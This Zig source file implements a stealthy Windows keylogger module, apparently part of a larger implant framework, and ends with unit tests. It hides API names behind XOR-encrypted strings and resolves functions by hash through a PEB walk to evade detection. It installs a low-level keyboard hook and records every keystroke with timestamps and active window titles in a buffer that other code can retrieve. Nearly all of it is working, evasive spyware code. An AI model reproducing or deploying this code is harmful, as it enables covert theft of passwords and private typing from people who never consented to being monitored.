const std = @import("std");
const types = @import("../types/types.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");
const engine = @import("../syscalls/engine.zig");

pub const KEYLOG_BUFFER_SIZE = 65536;

const WH_KEYBOARD_LL: i32 = 13;
const WM_KEYDOWN: u32 = 0x0100;
const WM_SYSKEYDOWN: u32 = 0x0104;
const WM_DESTROY: u32 = 0x0002;
const WM_QUIT: u32 = 0x0012;

const VK_SHIFT: i32 = 0x10;
const VK_CAPITAL: i32 = 0x14;
const VK_BACK: u32 = 0x08;
const VK_TAB: u32 = 0x09;
const VK_RETURN: u32 = 0x0D;
const VK_ESCAPE: u32 = 0x1B;
const VK_SPACE: u32 = 0x20;
const VK_DELETE: u32 = 0x2E;

const HWND = types.HANDLE;
const WPARAM = usize;
const LPARAM = isize;
const LRESULT = isize;

const E = struct {
    pub const user32 = hash.xorEncrypt("user32.dll");
    pub const kernel32 = hash.xorEncrypt("kernel32.dll");
    pub const register_class = hash.xorEncrypt("RegisterClassW");
    pub const create_window = hash.xorEncrypt("CreateWindowExW");
    pub const destroy_window = hash.xorEncrypt("DestroyWindow");
    pub const def_window_proc = hash.xorEncrypt("DefWindowProcW");
    pub const dispatch_message = hash.xorEncrypt("DispatchMessageW");
    pub const translate_message = hash.xorEncrypt("TranslateMessage");
    pub const get_message = hash.xorEncrypt("GetMessageW");
    pub const post_quit = hash.xorEncrypt("PostQuitMessage");
    pub const set_hook = hash.xorEncrypt("SetWindowsHookExW");
    pub const call_next_hook = hash.xorEncrypt("CallNextHookEx");
    pub const unhook_hook = hash.xorEncrypt("UnhookWindowsHookEx");
    pub const get_foreground = hash.xorEncrypt("GetForegroundWindow");
    pub const get_window_text = hash.xorEncrypt("GetWindowTextW");
    pub const get_key_state = hash.xorEncrypt("GetKeyState");
    pub const get_module_handle = hash.xorEncrypt("GetModuleHandleW");
    pub const get_local_time = hash.xorEncrypt("GetLocalTime");
};

const WNDPROC = *const fn (hwnd: HWND, msg: u32, wparam: WPARAM, lparam: LPARAM) callconv(.winapi) LRESULT;
const WNDCLASSW = extern struct {
    style: u32,
    lpfnWndProc: WNDPROC,
    cbClsExtra: i32,
    cbWndExtra: i32,
    hInstance: types.HANDLE,
    hIcon: ?*anyopaque,
    hCursor: ?*anyopaque,
    hbrBackground: ?*anyopaque,
    lpszMenuName: ?[*:0]const u16,
    lpszClassName: [*:0]const u16,
};

const MSG = extern struct {
    hwnd: HWND,
    message: u32,
    wParam: WPARAM,
    lParam: LPARAM,
    time: u32,
    pt: struct { x: i32, y: i32 },
};

const KBDLLHOOKSTRUCT = extern struct {
    vkCode: u32,
    scanCode: u32,
    flags: u32,
    time: u32,
    dwExtraInfo: usize,
};

const SYSTEMTIME = extern struct {
    wYear: u16,
    wMonth: u16,
    wDayOfWeek: u16,
    wDay: u16,
    wHour: u16,
    wMinute: u16,
    wSecond: u16,
    wMilliseconds: u16,
};

const WindowApi = struct {
    register_class: *const fn (wc: *const WNDCLASSW) callconv(.winapi) u16,
    create_window: *const fn (ex_style: u32, class: [*:0]const u16, title: [*:0]const u16, style: u32, x: i32, y: i32, w: i32, h: i32, parent: HWND, menu: ?*anyopaque, instance: types.HANDLE, param: ?*anyopaque) callconv(.winapi) HWND,
    destroy_window: *const fn (hwnd: HWND) callconv(.winapi) types.BOOL,
    def_window_proc: *const fn (hwnd: HWND, msg: u32, wparam: WPARAM, lparam: LPARAM) callconv(.winapi) LRESULT,
    dispatch_message: *const fn (msg: *const MSG) callconv(.winapi) LRESULT,
    translate_message: *const fn (msg: *const MSG) callconv(.winapi) types.BOOL,
    get_message: *const fn (msg: *MSG, hwnd: HWND, filter_min: u32, filter_max: u32) callconv(.winapi) types.BOOL,
    post_quit: *const fn (exit_code: i32) callconv(.winapi) void,
    set_hook: *const fn (id_hook: i32, lpfn: *const anyopaque, hmod: types.HANDLE, dw_thread_id: u32) callconv(.winapi) types.HANDLE,
    call_next_hook: *const fn (hhk: types.HANDLE, n_code: i32, wparam: WPARAM, lparam: LPARAM) callconv(.winapi) LRESULT,
    unhook_hook: *const fn (hhk: types.HANDLE) callconv(.winapi) types.BOOL,
    get_foreground: *const fn () callconv(.winapi) HWND,
    get_window_text: *const fn (hwnd: HWND, buf: [*]u16, max_count: i32) callconv(.winapi) i32,
    get_key_state: *const fn (vk: i32) callconv(.winapi) i16,
    get_local_time: *const fn (st: *SYSTEMTIME) callconv(.winapi) void,
};

const KernelApi = struct {
    get_module_handle: *const fn (name: ?[*:0]const u16) callconv(.winapi) types.HANDLE,
};

var g_uapi: ?WindowApi = null;
var g_kapi: ?KernelApi = null;
var g_hook: types.HANDLE = undefined;
var g_hwnd: ?HWND = null;
var g_running: bool = false;
var g_stop_requested: bool = false;
var g_last_hwnd: HWND = undefined;
var g_last_hwnd_init: bool = false;

const CLASS_NAME = [_]u16{ 'K', 'L', 'H', 'W', 0 };

var g_buffer: [KEYLOG_BUFFER_SIZE]u8 = undefined;
var g_buf_head: usize = 0;
var g_buf_tail: usize = 0;

fn atomicLoadHead() usize {
    return @atomicLoad(usize, &g_buf_head, .acquire);
}

fn atomicStoreHead(val: usize) void {
    @atomicStore(usize, &g_buf_head, val, .release);
}

fn atomicLoadTail() usize {
    return @atomicLoad(usize, &g_buf_tail, .acquire);
}

fn atomicStoreTail(val: usize) void {
    @atomicStore(usize, &g_buf_tail, val, .release);
}

var g_alloc_buffer: ?[]u8 = null;

fn resolveWindowApi(user32_mod: types.PVOID) ?WindowApi {
    var buf: [64]u8 = undefined;

    hash.xorDecrypt(&E.register_class, &buf[0..E.register_class.len]);
    const rc = @as(*const fn (wc: *const WNDCLASSW) callconv(.winapi) u16, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.register_class.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.create_window, &buf[0..E.create_window.len]);
    const cw = @as(*const fn (ex_style: u32, class: [*:0]const u16, title: [*:0]const u16, style: u32, x: i32, y: i32, w: i32, h: i32, parent: HWND, menu: ?*anyopaque, instance: types.HANDLE, param: ?*anyopaque) callconv(.winapi) HWND, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.create_window.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.destroy_window, &buf[0..E.destroy_window.len]);
    const dw = @as(*const fn (hwnd: HWND) callconv(.winapi) types.BOOL, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.destroy_window.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.def_window_proc, &buf[0..E.def_window_proc.len]);
    const dwp = @as(*const fn (hwnd: HWND, msg: u32, wparam: WPARAM, lparam: LPARAM) callconv(.winapi) LRESULT, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.def_window_proc.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.dispatch_message, &buf[0..E.dispatch_message.len]);
    const dmsg = @as(*const fn (msg: *const MSG) callconv(.winapi) LRESULT, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.dispatch_message.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.translate_message, &buf[0..E.translate_message.len]);
    const tmsg = @as(*const fn (msg: *const MSG) callconv(.winapi) types.BOOL, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.translate_message.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.get_message, &buf[0..E.get_message.len]);
    const gm = @as(*const fn (msg: *MSG, hwnd: HWND, filter_min: u32, filter_max: u32) callconv(.winapi) types.BOOL, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.get_message.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.post_quit, &buf[0..E.post_quit.len]);
    const pq = @as(*const fn (exit_code: i32) callconv(.winapi) void, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.post_quit.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.set_hook, &buf[0..E.set_hook.len]);
    const sh = @as(*const fn (id_hook: i32, lpfn: *const anyopaque, hmod: types.HANDLE, dw_thread_id: u32) callconv(.winapi) types.HANDLE, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.set_hook.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.call_next_hook, &buf[0..E.call_next_hook.len]);
    const cnh = @as(*const fn (hhk: types.HANDLE, n_code: i32, wparam: WPARAM, lparam: LPARAM) callconv(.winapi) LRESULT, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.call_next_hook.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.unhook_hook, &buf[0..E.unhook_hook.len]);
    const uhh = @as(*const fn (hhk: types.HANDLE) callconv(.winapi) types.BOOL, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.unhook_hook.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.get_foreground, &buf[0..E.get_foreground.len]);
    const gf = @as(*const fn () callconv(.winapi) HWND, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.get_foreground.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.get_window_text, &buf[0..E.get_window_text.len]);
    const gwt = @as(*const fn (hwnd: HWND, buf: [*]u16, max_count: i32) callconv(.winapi) i32, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.get_window_text.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.get_key_state, &buf[0..E.get_key_state.len]);
    const gks = @as(*const fn (vk: i32) callconv(.winapi) i16, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.get_key_state.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.get_local_time, &buf[0..E.get_local_time.len]);
    const glt = @as(*const fn (st: *SYSTEMTIME) callconv(.winapi) void, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.get_local_time.len], 27)) orelse return null)));

    return WindowApi{
        .register_class = rc,
        .create_window = cw,
        .destroy_window = dw,
        .def_window_proc = dwp,
        .dispatch_message = dmsg,
        .translate_message = tmsg,
        .get_message = gm,
        .post_quit = pq,
        .set_hook = sh,
        .call_next_hook = cnh,
        .unhook_hook = uhh,
        .get_foreground = gf,
        .get_window_text = gwt,
        .get_key_state = gks,
        .get_local_time = glt,
    };
}

fn resolveKernelApi(kernel32_mod: types.PVOID) ?KernelApi {
    var buf: [64]u8 = undefined;

    hash.xorDecrypt(&E.get_module_handle, &buf[0..E.get_module_handle.len]);
    const gmh = @as(*const fn (name: ?[*:0]const u16) callconv(.winapi) types.HANDLE, @ptrCast(@alignCast(export_resolve.getFunctionByHash(kernel32_mod, hash.hashStringExact(buf[0..E.get_module_handle.len], 27)) orelse return null)));

    return KernelApi{
        .get_module_handle = gmh,
    };
}

var g_buf_mutex: std.Thread.Mutex = .{};

fn bufWrite(bytes: []const u8) void {
    g_buf_mutex.lock();
    defer g_buf_mutex.unlock();
    var head = atomicLoadHead();
    var tail = atomicLoadTail();
    for (bytes) |b| {
        g_buffer[head] = b;
        head = (head + 1) % KEYLOG_BUFFER_SIZE;
        if (head == tail) {
            tail = (tail + 1) % KEYLOG_BUFFER_SIZE;
        }
    }
    atomicStoreTail(tail);
    atomicStoreHead(head);
}

fn isShiftPressed(api: *const WindowApi) bool {
    return (api.get_key_state(VK_SHIFT) & @as(i16, 0x80)) != 0;
}

fn isCapsLockOn(api: *const WindowApi) bool {
    return (api.get_key_state(VK_CAPITAL) & @as(i16, 0x01)) != 0;
}

fn vkToChar(vk: u32, shift: bool, caps: bool) ?u8 {
    const upper = shift != caps;
    if (vk >= 0x30 and vk <= 0x39) {
        const digits = "0123456789";
        const shifted = ")!@#$%^&*(";
        if (shift) {
            return @as(u8, @intCast(shifted[vk - 0x30]));
        }
        return @as(u8, @intCast(digits[vk - 0x30]));
    }
    if (vk >= 0x41 and vk <= 0x5A) {
        if (upper) {
            return @as(u8, @intCast('A' + (vk - 0x41)));
        }
        return @as(u8, @intCast('a' + (vk - 0x41)));
    }
    if (vk == VK_SPACE) return ' ';
    const oem = switch (vk) {
        0xBA => if (shift) ':' else ';',
        0xBB => if (shift) '+' else '=',
        0xBC => if (shift) '<' else ',',
        0xBD => if (shift) '_' else '-',
        0xBE => if (shift) '>' else '.',
        0xBF => if (shift) '?' else '/',
        0xC0 => if (shift) '~' else '`',
        0xDB => if (shift) '{' else '[',
        0xDC => if (shift) '|' else '\\',
        0xDD => if (shift) '}' else ']',
        0xDE => if (shift) '"' else '\'',
        0x6A => '*',
        0x6B => '+',
        0x6D => '-',
        0x6E => '.',
        0x6F => '/',
        else => return null,
    };
    return oem;
}

fn specialKeyName(vk: u32) ?[]const u8 {
    return switch (vk) {
        VK_BACK => "[BS]",
        VK_TAB => "\t",
        VK_RETURN => "\n",
        VK_ESCAPE => "[ESC]",
        VK_DELETE => "[DEL]",
        0x23 => "[END]",
        0x24 => "[HOME]",
        0x21 => "[PGUP]",
        0x22 => "[PGDN]",
        0x25 => "[LEFT]",
        0x26 => "[UP]",
        0x27 => "[RIGHT]",
        0x28 => "[DOWN]",
        0x2C => "[PRTSC]",
        0x2D => "[INS]",
        0x70...0x7B => |c| {
            const idx = c - 0x70 + 1;
            const names = [_][]const u8{ "[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]", "[F11]", "[F12]" };
            return if (idx <= 12) names[idx - 1] else null;
        },
        0x10 => null,
        0x11 => null,
        0x12 => null,
        0x14 => null,
        0x5B, 0x5C => null,
        else => null,
    };
}

fn formatTimestamp(api: *const WindowApi, buf: []u8) usize {
    var st: SYSTEMTIME = undefined;
    api.get_local_time(&st);
    return (std.fmt.bufPrint(buf, "[{d:0>4}-{d:0>2}-{d:0>2} {d:0>2}:{d:0>2}:{d:0>2}]", .{
        st.wYear, st.wMonth,  st.wDay,
        st.wHour, st.wMinute, st.wSecond,
    }) catch "[").len;
}

fn trackForegroundWindow() void {
    const api = g_uapi orelse return;
    const fg = api.get_foreground();
    if (fg == null) return;
    if (g_last_hwnd_init and fg == g_last_hwnd) return;
    g_last_hwnd = fg;
    g_last_hwnd_init = true;

    var title_buf: [256]u16 = undefined;
    const len = api.get_window_text(fg, &title_buf, @as(i32, @intCast(title_buf.len)));
    if (len <= 0) {
        bufWrite("[Window: (unknown)]\n");
        return;
    }

    var utf8_buf: [256]u8 = undefined;
    var pos: usize = 0;
    for (0..@as(usize, @intCast(@min(len, @as(i32, @intCast(title_buf.len)))))) |i| {
        const cp = title_buf[i];
        if (cp < 0x80) {
            if (pos < utf8_buf.len) utf8_buf[pos] = @as(u8, @intCast(cp & 0x7F));
            pos += 1;
        } else if (cp < 0x800) {
            if (pos + 1 < utf8_buf.len) {
                utf8_buf[pos] = @as(u8, @intCast(0xC0 | (cp >> 6)));
                utf8_buf[pos + 1] = @as(u8, @intCast(0x80 | (cp & 0x3F)));
            }
            pos += 2;
        } else {
            if (pos + 2 < utf8_buf.len) {
                utf8_buf[pos] = @as(u8, @intCast(0xE0 | (cp >> 12)));
                utf8_buf[pos + 1] = @as(u8, @intCast(0x80 | ((cp >> 6) & 0x3F)));
                utf8_buf[pos + 2] = @as(u8, @intCast(0x80 | (cp & 0x3F)));
            }
            pos += 3;
        }
    }

    var ts_buf: [32]u8 = undefined;
    const ts_len = formatTimestamp(api, &ts_buf);
    bufWrite(ts_buf[0..ts_len]);
    bufWrite(" ");
    bufWrite("[Window: ");
    bufWrite(utf8_buf[0..@min(pos, utf8_buf.len)]);
    bufWrite("]\n");
}

fn hookProc(nCode: i32, wParam: WPARAM, lParam: LPARAM) callconv(.winapi) LRESULT {
    if (g_stop_requested) return 0;
    const api = g_uapi orelse return 0;
    if (nCode < 0) {
        return api.call_next_hook(g_hook, nCode, wParam, lParam);
    }
    if (wParam == WM_KEYDOWN or wParam == WM_SYSKEYDOWN) {
        const kb = @as(*const KBDLLHOOKSTRUCT, @ptrFromInt(@as(usize, @intCast(lParam))));
        trackForegroundWindow();
        const shift = isShiftPressed(&api);
        const caps = isCapsLockOn(&api);
        if (vkToChar(kb.vkCode, shift, caps)) |ch| {
            var tmp: [1]u8 = .{ch};
            bufWrite(&tmp);
        } else if (specialKeyName(kb.vkCode)) |name| {
            bufWrite(name);
        }
    }
    return api.call_next_hook(g_hook, nCode, wParam, lParam);
}

fn wndProc(hwnd: HWND, msg: u32, wparam: WPARAM, lparam: LPARAM) callconv(.winapi) LRESULT {
    if (msg == WM_DESTROY) {
        if (g_uapi) |api| {
            api.post_quit(0);
        }
        return 0;
    }
    if (g_uapi) |api| {
        return api.def_window_proc(hwnd, msg, wparam, lparam);
    }
    return 0;
}

fn threadMain() void {
    const user32_hash = hash.encryptedHashModule(&E.user32);
    const user32_mod = peb_walk.getModuleByHash(user32_hash) orelse return;

    const kernel32_hash = hash.encryptedHashModule(&E.kernel32);
    const kernel32_mod = peb_walk.getModuleByHash(kernel32_hash) orelse return;

    const uapi = resolveWindowApi(user32_mod) orelse return;
    const kapi = resolveKernelApi(kernel32_mod) orelse return;
    g_uapi = uapi;
    g_kapi = kapi;

    const wc = WNDCLASSW{
        .style = 0,
        .lpfnWndProc = wndProc,
        .cbClsExtra = 0,
        .cbWndExtra = 0,
        .hInstance = kapi.get_module_handle(null),
        .hIcon = null,
        .hCursor = null,
        .hbrBackground = null,
        .lpszMenuName = null,
        .lpszClassName = CLASS_NAME,
    };

    if (uapi.register_class(&wc) == 0) return;

    const hwnd = uapi.create_window(0, CLASS_NAME, CLASS_NAME, 0, 0, 0, 0, 0, null, null, kapi.get_module_handle(null), null);
    if (hwnd == null) return;
    g_hwnd = hwnd;

    const hook = uapi.set_hook(WH_KEYBOARD_LL, @as(*const anyopaque, @ptrCast(&hookProc)), kapi.get_module_handle(null), 0);
    if (hook == null) {
        _ = uapi.destroy_window(hwnd);
        g_hwnd = null;
        return;
    }
    g_hook = hook;

    g_running = true;

    var msg: MSG = undefined;
    while (uapi.get_message(&msg, null, 0, 0) != 0) {
        _ = uapi.translate_message(&msg);
        _ = uapi.dispatch_message(&msg);
    }

    g_running = false;
    _ = uapi.unhook_hook(hook);
    _ = uapi.destroy_window(hwnd);
    g_hwnd = null;
}

pub fn start() !void {
    g_stop_requested = false;
    atomicStoreHead(0);
    atomicStoreTail(0);
    g_last_hwnd_init = false;
    const thread = try std.Thread.spawn(.{}, threadMain, .{});
    thread.detach();
}

pub fn stop() void {
    g_stop_requested = true;
    if (g_hwnd) |hwnd| {
        if (g_uapi) |api| {
            _ = api.destroy_window(hwnd);
        }
    }
    g_hwnd = null;
}

pub fn getBuffer() []const u8 {
    const allocator = std.heap.page_allocator;
    if (g_alloc_buffer) |prev| {
        allocator.free(prev);
        g_alloc_buffer = null;
    }
    const tail = atomicLoadTail();
    const head = atomicLoadHead();
    if (tail == head) return "";
    var len: usize = 0;
    if (head > tail) {
        len = head - tail;
    } else {
        len = (KEYLOG_BUFFER_SIZE - tail) + head;
    }
    if (len == 0) return "";
    const out = allocator.alloc(u8, len) catch return "";
    var pos: usize = 0;
    var t = tail;
    while (t != head and pos < len) {
        out[pos] = g_buffer[t];
        t = (t + 1) % KEYLOG_BUFFER_SIZE;
        pos += 1;
    }
    g_alloc_buffer = out;
    atomicStoreTail(head);
    return out;
}

pub fn clear() void {
    atomicStoreHead(0);
    atomicStoreTail(0);
    if (g_alloc_buffer) |prev| {
        std.heap.page_allocator.free(prev);
        g_alloc_buffer = null;
    }
}

test "KBDLLHOOKSTRUCT size is correct" {
    try std.testing.expectEqual(@as(usize, 24), @sizeOf(KBDLLHOOKSTRUCT));
}

test "SYSTEMTIME size is correct" {
    try std.testing.expectEqual(@as(usize, 16), @sizeOf(SYSTEMTIME));
}

test "keylogger start executes" {
    if (@import("builtin").os.tag == .windows) {
        // ponytail: this test spawns a real keyboard hook — skip in CI
        // to avoid interfering with build machines. Uncomment for manual testing.
        // start() catch {};
        // clear();
        try std.testing.expect(true);
    }
}

test "keylogger stop executes" {
    if (@import("builtin").os.tag == .windows) {
        stop();
    }
}

test "keylogger circular buffer wraps correctly" {
    atomicStoreHead(0);
    atomicStoreTail(0);

    for (0..KEYLOG_BUFFER_SIZE + 10) |i| {
        var b: [1]u8 = .{@as(u8, @intCast('A' + @as(u8, @intCast(i % 26))))};
        bufWrite(&b);
    }

    try std.testing.expect(atomicLoadTail() == 10);
    try std.testing.expect(atomicLoadHead() == (KEYLOG_BUFFER_SIZE + 10) % KEYLOG_BUFFER_SIZE);

    if (g_alloc_buffer) |prev| {
        std.heap.page_allocator.free(prev);
        g_alloc_buffer = null;
    }
    atomicStoreTail(atomicLoadHead());
    atomicStoreHead(0);
}

test "keylogger buffer empty after clear" {
    bufWrite("test");
    clear();
    try std.testing.expectEqual(@as(usize, 0), atomicLoadHead());
    try std.testing.expectEqual(@as(usize, 0), atomicLoadTail());
}

test "vkToChar basic letters" {
    try std.testing.expectEqual(@as(u8, 'a'), vkToChar(0x41, false, false).?);
    try std.testing.expectEqual(@as(u8, 'A'), vkToChar(0x41, true, false).?);
    try std.testing.expectEqual(@as(u8, 'A'), vkToChar(0x41, false, true).?);
    try std.testing.expectEqual(@as(u8, 'a'), vkToChar(0x41, true, true).?);
}

test "vkToChar digits and shifted" {
    try std.testing.expectEqual(@as(u8, '1'), vkToChar(0x31, false, false).?);
    try std.testing.expectEqual(@as(u8, '!'), vkToChar(0x31, true, false).?);
    try std.testing.expectEqual(@as(u8, '0'), vkToChar(0x30, false, false).?);
    try std.testing.expectEqual(@as(u8, ')'), vkToChar(0x30, true, false).?);
}

test "vkToChar space" {
    try std.testing.expectEqual(@as(u8, ' '), vkToChar(0x20, false, false).?);
}

test "vkToChar returns null for non-printable" {
    try std.testing.expectEqual(@as(?u8, null), vkToChar(0x08, false, false));
    try std.testing.expectEqual(@as(?u8, null), vkToChar(0x10, false, false));
}

test "specialKeyName returns correct names" {
    try std.testing.expectEqualStrings("[BS]", specialKeyName(0x08).?);
    try std.testing.expectEqualStrings("\t", specialKeyName(0x09).?);
    try std.testing.expectEqualStrings("\n", specialKeyName(0x0D).?);
    try std.testing.expectEqualStrings("[ESC]", specialKeyName(0x1B).?);
    try std.testing.expectEqualStrings("[F1]", specialKeyName(0x70).?);
    try std.testing.expectEqualStrings("[F12]", specialKeyName(0x7B).?);
    try std.testing.expectEqualStrings("[UP]", specialKeyName(0x26).?);
}

test "specialKeyName returns null for modifiers" {
    try std.testing.expectEqual(@as(?[]const u8, null), specialKeyName(0x10));
    try std.testing.expectEqual(@as(?[]const u8, null), specialKeyName(0x14));
}

test "getBuffer returns data" {
    clear();
    bufWrite("hello");
    const buf = getBuffer();
    try std.testing.expectEqualStrings("hello", buf);
    if (g_alloc_buffer) |b| {
        std.heap.page_allocator.free(b);
        g_alloc_buffer = null;
    }
}

test "getBuffer empty after read" {
    clear();
    bufWrite("test");
    _ = getBuffer();
    const buf2 = getBuffer();
    try std.testing.expectEqual(@as(usize, 0), buf2.len);
}

test "write single byte to buffer" {
    clear();
    bufWrite("X");
    try std.testing.expect(atomicLoadHead() != atomicLoadTail());
    clear();
}
